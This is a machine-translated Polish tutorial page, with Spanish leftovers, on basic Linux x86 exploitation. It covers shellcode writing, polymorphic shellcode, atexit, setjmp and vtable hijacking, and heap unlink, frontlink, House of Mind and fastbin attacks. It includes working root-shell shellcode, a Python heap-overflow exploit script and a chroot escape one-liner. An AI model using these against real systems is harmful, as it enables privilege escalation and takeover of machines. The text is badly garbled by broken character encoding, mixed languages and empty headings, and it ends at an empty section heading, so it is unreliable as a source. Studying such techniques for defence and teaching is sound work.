# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** â€”> Nos devuelve un .o\
**ld assembly.o -o shellcodeout** â€”> Nos da un ejecutable formado por el cÃ³digo ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Aby sprawdziÄ‡, czy wywoÅ‚ania systemowe sÄ… wykonywane poprawnie, naleÅ¼y skompilowaÄ‡ poprzedni program, a wywoÅ‚ania systemowe powinny pojawiÄ‡ siÄ™ w **strace ./SKOMPILOWANY\_PROGRAM**

Podczas tworzenia shellcode'u moÅ¼na zastosowaÄ‡ sztuczkÄ™. Pierwsza instrukcja to skok do wywoÅ‚ania. WywoÅ‚anie wykonuje oryginalny kod i dodatkowo umieszcza EIP na stosie. Po instrukcji call umieszczamy potrzebny nam ciÄ…g znakÃ³w, dziÄ™ki czemu za pomocÄ… tego EIP moÅ¼emy wskazaÄ‡ na ciÄ…g znakÃ³w i kontynuowaÄ‡ wykonywanie kodu.

EJ **SZTUCZKA (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**UÅ¼ycie ESP z uÅ¼yciem stosu (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**Eksportowanie Stanu ZawartoÅ›ci Rejestru FPU:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Åowca jajek:**

Polega na maÅ‚ym kodzie, ktÃ³ry przeszukuje strony pamiÄ™ci powiÄ…zane z procesem w poszukiwaniu tam przechowywanej shellcode (szuka jakiegoÅ› podpisu umieszczonego w shellcode). Przydatne w przypadkach, gdy mamy tylko niewielkÄ… przestrzeÅ„ do wstrzykniÄ™cia kodu.

**Shellkody polimorficzne**

PolegajÄ… na zaszyfrowanych shellach, ktÃ³re majÄ… maÅ‚e kody deszyfrujÄ…ce i skaczÄ…ce do nich, uÅ¼ywajÄ…c sztuczki Call-Pop, oto **przykÅ‚ad zaszyfrowanego szyfru Cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Metody uzupeÅ‚niajÄ…ce**





**Technika Murata**

W systemie Linux wszystkie programy sÄ… mapowane zaczynajÄ…c od 0xbfffffff

AnalizujÄ…c jak jest budowany stos nowego procesu w systemie Linux, moÅ¼na opracowaÄ‡ exploit w taki sposÃ³b, Å¼e program zostanie uruchomiony w Å›rodowisku, w ktÃ³rym jedynÄ… zmiennÄ… jest shellcode. Adres tej zmiennej moÅ¼na obliczyÄ‡ jako: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

W ten sposÃ³b moÅ¼na Å‚atwo uzyskaÄ‡ adres zmiennej Å›rodowiskowej zawierajÄ…cej shellcode.

MoÅ¼na to zrobiÄ‡ dziÄ™ki funkcji execle, ktÃ³ra pozwala tworzyÄ‡ Å›rodowisko zawierajÄ…ce tylko te zmienne Å›rodowiskowe, ktÃ³re sÄ… wymagane.



##

###

###

###

###

### **Formatowanie Å‚aÅ„cuchÃ³w do przepeÅ‚nieÅ„ buforÃ³w**

Funkcja **sprintf** przesuwa sformatowany Å‚aÅ„cuch do zmiennej. Dlatego moÅ¼na naduÅ¼yÄ‡ formatowania Å‚aÅ„cucha, aby spowodowaÄ‡ przepeÅ‚nienie bufora w zmiennej, do ktÃ³rej jest kopiowana zawartoÅ›Ä‡.\
Na przykÅ‚ad Å‚adunek `%.44xAAAA` zapisze 44B+"AAAA" w zmiennej, co moÅ¼e spowodowaÄ‡ przepeÅ‚nienie bufora.

### **Struktury \_\_atexit**

{% hint style="danger" %}
Obecnie jest bardzo **rzadko wykorzystywane**.
{% endhint %}

Funkcja **`atexit()`** to funkcja, do ktÃ³rej przekazywane sÄ… inne funkcje jako parametry. Te funkcje zostanÄ… wykonane podczas wywoÅ‚ania **`exit()`** lub powrotu z funkcji **main**.\
JeÅ›li moÅ¼na **zmodyfikowaÄ‡** adres ktÃ³rejÅ› z tych funkcji, aby wskazywaÅ‚ na shellcode na przykÅ‚ad, moÅ¼na przejÄ…Ä‡ kontrolÄ™ nad procesem, ale obecnie jest to bardziej skomplikowane.\
Obecnie **adresy funkcji** do wykonania sÄ… **ukryte** za kilkoma strukturami, a ostatecznie adres, na ktÃ³ry wskazujÄ…, nie jest adresem funkcji, lecz jest **zaszyfrowany za pomocÄ… operacji XOR** i przesuniÄ™Ä‡ z **losowym kluczem**. Dlatego obecnie ten wektor ataku nie jest zbyt przydatny, przynajmniej na architekturach x86 i x64\_86.\
Funkcja **szyfrowania** to **`PTR_MANGLE`**. **Inne architektury** takie jak m68k, mips32, mips64, aarch64, arm, hppa... **nie implementujÄ… funkcji szyfrowania**, poniewaÅ¼ **zwracajÄ… to samo**, co otrzymaÅ‚y jako dane wejÅ›ciowe. Dlatego te architektury mogÄ… byÄ‡ podatne na ten wektor ataku.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Obecnie jest bardzo **rzadko wykorzystywane**.
{% endhint %}

**`Setjmp()`** pozwala **zapisaÄ‡** kontekst (rejestry)\
**`longjmp()`** pozwala **przywrÃ³ciÄ‡** kontekst.\
Zapisane rejestry to: `EBX, ESI, EDI, ESP, EIP, EBP`\
Problem polega na tym, Å¼e EIP i ESP sÄ… przekazywane przez funkcjÄ™ **`PTR_MANGLE`**, wiÄ™c **architektury podatne na ten atak sÄ… takie same jak wyÅ¼ej**.\
SÄ… one przydatne do obsÅ‚ugi bÅ‚Ä™dÃ³w lub przerwaÅ„.\
Jednak z tego, co przeczytaÅ‚em, inne rejestry nie sÄ… chronione, **wiÄ™c jeÅ›li wewnÄ…trz wywoÅ‚ywanej funkcji wystÄ™puje `call ebx`, `call esi` lub `call edi`**, moÅ¼na przejÄ…Ä‡ kontrolÄ™. MoÅ¼na takÅ¼e zmodyfikowaÄ‡ EBP, aby zmieniÄ‡ ESP.

**VTable i VPTR w C++**

KaÅ¼da klasa ma **Vtable**, ktÃ³ra jest tablicÄ… **wskaÅºnikÃ³w do metod**.

KaÅ¼dy obiekt klasy ma **VPtr**, ktÃ³ry jest **wskaÅºnikiem** do tablicy swojej klasy. VPtr jest czÄ™Å›ciÄ… nagÅ‚Ã³wka kaÅ¼dego obiektu, wiÄ™c jeÅ›li osiÄ…gniÄ™to **nadpisanie** VPtr, moÅ¼na je **zmieniÄ‡**, aby wskazywaÅ‚o na metodÄ™ zastÄ™pczÄ…, dziÄ™ki czemu wykonanie funkcji przejdzie do shellcode.

## **Åšrodki zapobiegawcze i unikanie**

###

**ZastÄ…pienie Libsafe**

WÅ‚Ä…cza siÄ™ za pomocÄ…: LD\_PRELOAD=/lib/libsafe.so.2\
lub\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

WywoÅ‚ania niektÃ³rych funkcji niewÅ‚aÅ›ciwych sÄ… przechwytywane przez inne bezpieczne funkcje. Nie jest to standaryzowane. (tylko dla x86, nie dla kompilacji z -fomit-frame-pointer, nie dla statycznych kompilacji, nie wszystkie niewÅ‚aÅ›ciwe funkcje stajÄ… siÄ™ bezpieczne, a LD\_PRELOAD nie dziaÅ‚a dla binarnych z ustawionym suid).

**ASCII Armored Address Space**

Polega na Å‚adowaniu wspÃ³Å‚dzielonych bibliotek od 0x00000000 do 0x00ffffff, aby zawsze byÅ‚ bajt 0x00. JednakÅ¼e to nie zatrzymuje praktycznie Å¼adnego ataku, a tym bardziej w little endian.

**ret2plt**

Polega na wykonaniu ROP w taki sposÃ³b, Å¼e wywoÅ‚ywana jest funkcja strcpy@plt (z plt), a nastÄ™pnie wskazuje siÄ™ na wpis w GOT i kopiowany jest pierwszy bajt funkcji, do ktÃ³rej chcemy siÄ™ odwoÅ‚aÄ‡ (system()). NastÄ™pnie to samo jest wykonywane wskazujÄ…c na GOT+1 i kopiujÄ…c 2. bajt system()... Na koÅ„cu wywoÅ‚ywany jest zapisany adres w GOT, ktÃ³ry bÄ™dzie system()

**Klatki z chroot()**

debootstrap -arch=i386 hardy /home/user â€”> Instaluje podstawowy system w okreÅ›lonym podkatalogu

Administrator moÅ¼e wyjÅ›Ä‡ z takiej klatki wykonujÄ…c: mkdir foo; chroot foo; cd ..

**Instrumentacja kodu**

Valgrind â€”> Wyszukuje bÅ‚Ä™dÃ³w\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 PrzepeÅ‚nienia sterty: Podstawowe exploity**

**Przydzielony kawaÅ‚ek**

prev\_size |\
size | â€”NagÅ‚Ã³wek\
\*mem | Dane

**Wolny kawaÅ‚ek**

prev\_size |\
size |\
\*fd | WskaÅºnik do przodu do kawaÅ‚ka\
\*bk | WskaÅºnik do tyÅ‚u do kawaÅ‚ka â€”NagÅ‚Ã³wek\
\*mem | Dane

Wolne kawaÅ‚ki sÄ… w liÅ›cie podwÃ³jnie wiÄ…zanej (bin) i nigdy nie mogÄ… wystÄ™powaÄ‡ dwa wolne kawaÅ‚ki obok siebie (sÄ… Å‚Ä…czone)

W "size" sÄ… bity wskazujÄ…ce: czy poprzedni kawaÅ‚ek jest uÅ¼ywany, czy kawaÅ‚ek zostaÅ‚ przydzielony za pomocÄ… mmap() i czy kawaÅ‚ek naleÅ¼y do gÅ‚Ã³wnego obszaru.

JeÅ›li przy zwalnianiu kawaÅ‚ka ktÃ³rykolwiek z sÄ…siednich kawaÅ‚kÃ³w jest wolny, sÄ… one Å‚Ä…czone za pomocÄ… makra unlink() i nowy, wiÄ™kszy kawaÅ‚ek jest przekazywany do frontlink() w celu wstawienia go do odpowiedniego binu.

unlink(){\
BK = P->bk; â€”> BK nowego kawaÅ‚ka to ten, ktÃ³ry byÅ‚ wolny wczeÅ›niej\
FD = P->fd; â€”> FD nowego kawaÅ‚ka to ten, ktÃ³ry byÅ‚ wolny wczeÅ›niej\
FD->bk = BK; â€”> BK nastÄ™pnego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
BK->fd = FD; â€”> FD poprzedniego kawaÅ‚ka wskazuje na nowy kawaÅ‚ek\
}

Dlatego jeÅ›li uda siÄ™ zmodyfikowaÄ‡ P->bk na adres shellcode i P->fd na adres wpisu w GOT lub DTORS pomniejszony o 12, osiÄ…gniÄ™to:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

W ten sposÃ³b po wyjÅ›ciu z programu zostanie wykonana shellcode.

Dodatkowo, 4. instrukcja unlink() zapisuje coÅ›, a shellcode musi byÄ‡ dostosowana do tego:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Spowoduje to zapisanie 4 bajtÃ³w od 8 bajtu shellcode, dlatego pierwsza instrukcja shellcode musi byÄ‡ skokiem, aby ominÄ…Ä‡ to i przejÅ›Ä‡ do nops prowadzÄ…cych do reszty shellcode.

Dlatego exploit jest tworzony:

W buforze1 umieszczamy shellcode zaczynajÄ…c od skoku, aby przejÅ›Ä‡ do nops lub reszty shellcode.

NastÄ™pnie po shellcode dodajemy wypeÅ‚nienie do osiÄ…gniÄ™cia pola prev\_size i size nastÄ™pnego kawaÅ‚ka. W tych miejscach umieszczamy 0xfffffff0 (aby nadpisaÄ‡ prev\_size i oznaczyÄ‡ go jako wolny) oraz â€œ-4â€ (0xfffffffc) w size (aby podczas sprawdzania w 3. kawaÅ‚ku, czy 2. byÅ‚ wolny, w rzeczywistoÅ›ci przejdzie do zmodyfikowanego prev\_size, ktÃ³ry wskaÅ¼e, Å¼e jest wolny) -> Dlatego gdy free() sprawdzi, przejdzie do size 3. kawaÅ‚ka, ale w rzeczywistoÅ›ci przejdzie do 2. - 4 i uzna, Å¼e 2. kawaÅ‚ek jest wolny. NastÄ™pnie zostanie wywoÅ‚ane **unlink()**.
Podczas wywoÅ‚ywania unlink() uÅ¼yje pierwszych danych z drugiego kawaÅ‚ka jako P->fd, wiÄ™c tam zostanie umieszczony adres, ktÃ³ry chcesz nadpisaÄ‡ - 12 (poniewaÅ¼ w FD->bk dodaje 12 do adresu przechowywanego w FD). NastÄ™pnie w tym adresie zostanie wprowadzony drugi adres znaleziony w drugim kawaÅ‚ku, ktÃ³ry bÄ™dzie interesujÄ…cy dla nas jako adres shellcode (faÅ‚szywy P->bk).

```python
from struct import *
import os

shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno
shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

prev_size = pack("<Iâ€, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo estÃ¡ libre estÃ© a 1
fake_size = pack("<Iâ€, 0xfffffffc) #-4, para que piense que el â€œsizeâ€ del 3Âº trozo estÃ¡ 4bytes detrÃ¡s (apunta a prev_size) pues es ahÃ­ donde mira si el 2Âº trozo estÃ¡ libre
addr_sc = pack("<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno
got_free = pack("<I", 0x08048300 - 12) #DirecciÃ³n de free() en la plt-12 (serÃ¡ la direcciÃ³n que se sobrescrita para que se lanza la shellcode la 2Âº vez que se llame a free)

payload = "aaaabbbb" + shellcode + "b"*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque sÃ­
payload += prev_size + fake_size + got_free + addr_sc #Se modifica el 2Âº trozo, el got_free apunta a donde vamos a guardar la direccion addr_sc + 12
os.system("./8.3.o " + payload)
```

**unset() liberando en sentido inverso (wargame)**

Kontrolujemy 3 kolejne kawaÅ‚ki i sÄ… one zwalniane w odwrotnej kolejnoÅ›ci do zarezerwowanej.

W tym przypadku:

W kawaÅ‚ku c umieszczamy shellcode

KawaÅ‚ek a uÅ¼ywamy do nadpisania b w taki sposÃ³b, Å¼e rozmiar ma wyÅ‚Ä…czony bit PREV_INUSE, aby myÅ›laÅ‚, Å¼e kawaÅ‚ek a jest wolny.

Dodatkowo, nadpisujemy w nagÅ‚Ã³wku b rozmiar, aby wynosiÅ‚ -4.

W rezultacie program bÄ™dzie myÅ›laÅ‚, Å¼e "a" jest wolny i w binie, wiÄ™c wywoÅ‚a unlink(), aby go odÅ‚Ä…czyÄ‡. JednakÅ¼e, poniewaÅ¼ nagÅ‚Ã³wek PREV_SIZE wynosi -4. BÄ™dzie myÅ›laÅ‚, Å¼e kawaÅ‚ek "a" zaczyna siÄ™ naprawdÄ™ w b+4. Innymi sÅ‚owy, wywoÅ‚a unlink() na kawaÅ‚ek, ktÃ³ry zaczyna siÄ™ w b+4, wiÄ™c w b+12 bÄ™dzie wskaÅºnik "fd", a w b+16 bÄ™dzie wskaÅºnik "bk".

W ten sposÃ³b, jeÅ›li w bk umieÅ›cimy adres shellcode, a w fd umieÅ›cimy adres funkcji "puts()" -12, mamy nasz payload.

**Technika Frontlink**

Frontlink jest wywoÅ‚ywany, gdy coÅ› jest zwalniane i Å¼aden z sÄ…siednich kawaÅ‚kÃ³w nie jest wolny, wtedy nie jest wywoÅ‚ywane unlink(), ale jest wywoÅ‚ywane bezpoÅ›rednio frontlink().

UÅ¼yteczna podatnoÅ›Ä‡, gdy atakowany malloc nigdy nie jest zwalniany (free()).

Wymagane:

Bufor, ktÃ³ry moÅ¼e byÄ‡ przepeÅ‚niony funkcjÄ… wejÅ›ciowÄ…

Bufor sÄ…siadujÄ…cy z tym, ktÃ³ry zostanie zwolniony i ktÃ³rego pole fd w nagÅ‚Ã³wku zostanie zmodyfikowane dziÄ™ki przepeÅ‚nieniu wczeÅ›niejszego bufora

Bufor do zwolnienia o rozmiarze wiÄ™kszym niÅ¼ 512, ale mniejszym niÅ¼ poprzedni bufor

Bufor zadeklarowany przed krokiem 3, ktÃ³ry pozwala na nadpisanie prev_size tego bufora

W ten sposÃ³b, nadpisujÄ…c w dwÃ³ch mallocach w sposÃ³b niekontrolowany i w jednym kontrolowanym, ktÃ³ry jest zwalniany tylko raz, moÅ¼emy przeprowadziÄ‡ exploit.

**PodatnoÅ›Ä‡ double free()**

JeÅ›li free() jest wywoÅ‚ywane dwa razy z tym samym wskaÅºnikiem, powstajÄ… dwa biny wskazujÄ…ce na ten sam adres.

JeÅ›li chcemy ponownie uÅ¼yÄ‡ jednego, nie ma problemu. JeÅ›li chcemy uÅ¼yÄ‡ innego, zostanie przypisane to samo miejsce, wiÄ™c mamy faÅ‚szywe wskaÅºniki "fd" i "bk" z danymi, ktÃ³re zapisze poprzednia rezerwacja.

**After free()**

WczeÅ›niej zwolniony wskaÅºnik jest ponownie uÅ¼ywany bez kontroli.

## **8 PrzepeÅ‚nienia sterty: Zaawansowane exploitacje**

Techniki Unlink() i FrontLink() zostaÅ‚y usuniÄ™te po zmodyfikowaniu funkcji unlink().

**The house of mind**

Wystarczy jedno wywoÅ‚anie free(), aby spowodowaÄ‡ wykonanie arbitralnego kodu. Warto znaleÅºÄ‡ drugi kawaÅ‚ek, ktÃ³ry moÅ¼e zostaÄ‡ przepeÅ‚niony przez poprzedni i zwolniony.

WywoÅ‚anie free() powoduje wywoÅ‚anie public_fREe(mem), ktÃ³re wykonuje:

mstate ar_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Zwraca wskaÅºnik do miejsca, od ktÃ³rego zaczyna siÄ™ kawaÅ‚ek (mem-8)

â€¦

ar_ptr = arena_for_chunk(p); â€”> chunk_non_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

â€¦

_int_free(ar_ptr, mem);

}

W \[1] sprawdzany jest rozmiar pola bitowego NON_MAIN_ARENA, ktÃ³ry moÅ¼na zmieniÄ‡, aby sprawdzenie zwrÃ³ciÅ‚o true i wywoÅ‚aÅ‚o heap_for_ptr(), ktÃ³re wykonuje operacjÄ™ and na "mem", ustawiajÄ…c na 0 2,5 najmniej znaczÄ…cych bajtÃ³w (w naszym przypadku z 0x0804a000 robi 0x08000000) i uzyskuje dostÄ™p do 0x08000000->ar_ptr (jak do struct heap_info)

W ten sposÃ³b, jeÅ›li moÅ¼emy kontrolowaÄ‡ kawaÅ‚ek na przykÅ‚ad w 0x0804a000 i kawaÅ‚ek zostanie zwolniony w **0x081002a0**, moÅ¼emy dotrzeÄ‡ do adresu 0x08100000 i zapisaÄ‡, co chcemy, na przykÅ‚ad **0x0804a000**. Gdy ten drugi kawaÅ‚ek zostanie zwolniony, heap_for_ptr(ptr)->ar_ptr zwrÃ³ci to, co napisaliÅ›my w 0x08100000 (poniewaÅ¼ stosuje siÄ™ do 0x081002a0 operacjÄ™ and, ktÃ³rÄ… widzieliÅ›my wczeÅ›niej, i stÄ…d wyciÄ…ga wartoÅ›Ä‡ pierwszych 4 bajtÃ³w, ar_ptr)

W ten sposÃ³b wywoÅ‚ywane jest \_int_free(ar_ptr, mem), czyli **\_int_free(0x0804a000, 0x081002a0)**\
**\_int_free(mstate av, Void_t\* mem){**\
â€¦\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Jak widzieliÅ›my wczeÅ›niej, moÅ¼emy kontrolowaÄ‡ wartoÅ›Ä‡ av, poniewaÅ¼ to, co piszemy w kawaÅ‚ku, ktÃ³ry zostanie zwolniony.

Zgodnie z definicjÄ… unsorted_chunks, wiemy, Å¼e:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dlatego jeÅ›li w av->bins\[2] zapiszemy wartoÅ›Ä‡ \_\_DTOR_END\_\_-12, w ostatniej instrukcji zostanie zapisane w \_\_DTOR_END\_\_ adres drugiego kawaÅ‚ka.

Innymi sÅ‚owy, na poczÄ…tku pierwszego kawaÅ‚ka musimy umieÅ›ciÄ‡ wiele razy adres \_\_DTOR_END\_\_-12, poniewaÅ¼ av->bins\[2] z niego korzysta.

W miejscu, gdzie znajduje siÄ™ adres drugiego kawaÅ‚ka z ostatnimi 5 zerami, naleÅ¼y zapisaÄ‡ adres tego pierwszego kawaÅ‚ka, aby heap_for_ptr() myÅ›laÅ‚, Å¼e ar_ptr znajduje siÄ™ na poczÄ…tku pierwszego kawaÅ‚ka i z niego wyciÄ…gnÄ…Å‚ av->bins\[2]
W drugim fragmencie, dziÄ™ki pierwszemu, nadpisujemy prev\_size za pomocÄ… jump 0x0c i size czymÅ›, aby aktywowaÄ‡ -> NON\_MAIN\_ARENA

NastÄ™pnie w fragmencie 2 umieszczamy wiele nops i ostatecznie shellcode

W ten sposÃ³b zostanie wywoÅ‚ane \_int\_free(TROZO1, TROZO2) i bÄ™dzie kontynuowaÄ‡ instrukcje, aby zapisaÄ‡ w \_\_DTOR\_END\_\_ adres prev\_size z TROZO2, ktÃ³ry skoczy do shellcode.

Aby zastosowaÄ‡ tÄ™ technikÄ™, konieczne jest speÅ‚nienie kilku dodatkowych wymagaÅ„, ktÃ³re nieco komplikujÄ… payload.

Ta technika nie jest juÅ¼ stosowana, poniewaÅ¼ zastosowano prawie ten sam patch co dla unlink. Sprawdzane jest, czy nowe miejsce, do ktÃ³rego siÄ™ odwoÅ‚ujemy, rÃ³wnieÅ¼ odwoÅ‚uje siÄ™ do nas.

**Fastbin**

To wariant The house of mind

Interesuje nas wykonanie nastÄ™pujÄ…cego kodu, do ktÃ³rego dochodzi po pierwszej weryfikacji funkcji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gdzie fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

W ten sposÃ³b, jeÅ›li umieÅ›cimy "fb" w adresie funkcji w GOT, pod tym adresem umieszczony zostanie adres nadpisanego fragmentu. Wymaga to, aby arena byÅ‚a blisko adresÃ³w dtors. DokÅ‚adniej mÃ³wiÄ…c, av->max\_fast musi znajdowaÄ‡ siÄ™ pod adresem, ktÃ³ry zamierzamy nadpisaÄ‡.

PoniewaÅ¼ w The House of Mind zauwaÅ¼ono, Å¼e kontrolowaliÅ›my pozycjÄ™ av.

JeÅ›li wiÄ™c w polu size umieÅ›cimy rozmiar 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() zwrÃ³ci fastbins\[-1\], ktÃ³ry wskaÅ¼e na av->max\_fast

W tym przypadku av->max\_fast bÄ™dzie adresem, ktÃ³ry zostanie nadpisany (nie wskaÅ¼e, ale to pozycja, ktÃ³ra zostanie nadpisana).

Dodatkowo musi byÄ‡ speÅ‚niony warunek, Å¼e fragment sÄ…siadujÄ…cy z uwolnionym musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar uwolnionego fragmentu to 8, w tym faÅ‚szywym fragmencie wystarczy umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode bÄ™dzie w uwolnionym fragmencie, na poczÄ…tku trzeba umieÅ›ciÄ‡ jump, ktÃ³ry trafi w nops).

Dodatkowo ten sam faÅ‚szywy fragment musi byÄ‡ mniejszy niÅ¼ av->system\_mem. av->system\_mem znajduje siÄ™ 1848 bajtÃ³w dalej.

Ze wzglÄ™du na zera z \_DTOR\_END\_ i niewiele adresÃ³w w GOT, Å¼aden z tych obszarÃ³w nie nadaje siÄ™ do nadpisania, zobaczmy wiÄ™c, jak zastosowaÄ‡ fastbin do ataku na stos.

Innym sposobem ataku jest przekierowanie **av** na stos.

JeÅ›li zmienimy rozmiar na 16 zamiast 8, wtedy: fastbin\_index() zwrÃ³ci fastbins\[0\] i moÅ¼emy tego uÅ¼yÄ‡ do nadpisania stosu.

W tym celu nie powinno byÄ‡ Å¼adnych canary ani dziwnych wartoÅ›ci na stosie, faktycznie musimy znaleÅºÄ‡ siÄ™ w takim ukÅ‚adzie: 4 bajty zerowe + EBP + RET

4 bajty zerowe sÄ… potrzebne, aby **av** znajdowaÅ‚ siÄ™ pod tym adresem, a pierwszym elementem **av** jest mutex, ktÃ³ry musi wynosiÄ‡ 0.

**av->max\_fast** bÄ™dzie EBP i bÄ™dzie wartoÅ›ciÄ…, ktÃ³ra pozwoli nam ominÄ…Ä‡ ograniczenia.

W **av->fastbins\[0\]** zostanie nadpisany adresem **p** i bÄ™dzie RET, dziÄ™ki czemu nastÄ…pi skok do shellcode.

Dodatkowo, w **av->system\_mem** (1484 bajty powyÅ¼ej pozycji na stosie) bÄ™dzie duÅ¼o Å›mieci, ktÃ³re pozwolÄ… nam ominÄ…Ä‡ sprawdzenie.

Dodatkowo musi byÄ‡ speÅ‚niony warunek, Å¼e fragment sÄ…siadujÄ…cy z uwolnionym musi byÄ‡ wiÄ™kszy niÅ¼ 8 -> PoniewaÅ¼ powiedzieliÅ›my, Å¼e rozmiar uwolnionego fragmentu to 16, w tym faÅ‚szywym fragmencie wystarczy umieÅ›ciÄ‡ rozmiar wiÄ™kszy niÅ¼ 8 (poniewaÅ¼ shellcode bÄ™dzie w uwolnionym fragmencie, na poczÄ…tku trzeba umieÅ›ciÄ‡ jump, ktÃ³ry trafi w nops, ktÃ³re znajdujÄ… siÄ™ po polu size nowego faÅ‚szywego fragmentu).

**The House of Spirit**

